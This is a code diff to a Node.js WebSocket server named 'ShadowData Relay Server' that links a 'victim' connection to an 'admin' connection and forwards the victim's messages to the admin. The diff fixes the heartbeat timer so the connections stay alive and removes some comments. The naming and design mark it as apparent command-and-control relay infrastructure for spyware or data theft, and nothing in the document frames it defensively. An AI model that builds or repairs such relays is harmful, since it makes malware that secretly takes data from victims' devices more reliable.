@@ -13,14 +13,14 @@ app.get('/', (req, res) => {
     res.send(`ShadowData Relay Server Active.<br>Victim Connected: ${!!victimSocket}<br>Admin Connected: ${!!adminSocket}`);
 });
 
-// Heartbeat interval to keep Render WebSocket connections alive
+// Heartbeat interval to keep Render WebSocket connections alive (Fixed interval syntax)
 const interval = setInterval(() => {
     wss.clients.forEach((ws) => {
         if (ws.isAlive === false) return ws.terminate();
         ws.isAlive = false;
         ws.ping();
-    }, 30000);
-});
+    });
+}, 30000); // Correctly passed as the second argument to setInterval
 
 wss.on('connection', (ws, req) => {
     ws.isAlive = true;
@@ -31,13 +31,13 @@ wss.on('connection', (ws, req) => {
 
     if (role === 'victim') {
         if (victimSocket && victimSocket.readyState === WebSocket.OPEN) {
-            victimSocket.terminate(); // Terminate previous stale victim connection if any
+            victimSocket.terminate();
         }
         victimSocket = ws;
         console.log('>>> Victim connected successfully.');
     } else if (role === 'admin') {
         if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
-            adminSocket.terminate(); // Terminate previous stale admin connection if any
+            adminSocket.terminate();
         }
         adminSocket = ws;
         console.log('>>> Admin connected successfully.');
@@ -64,8 +64,6 @@ wss.on('connection', (ws, req) => {
         } else if (role === 'victim') {
             if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
                 adminSocket.send(message);
-            } else {
-                // Admin not connected, drop silently to avoid memory buildup
             }
         }
     });
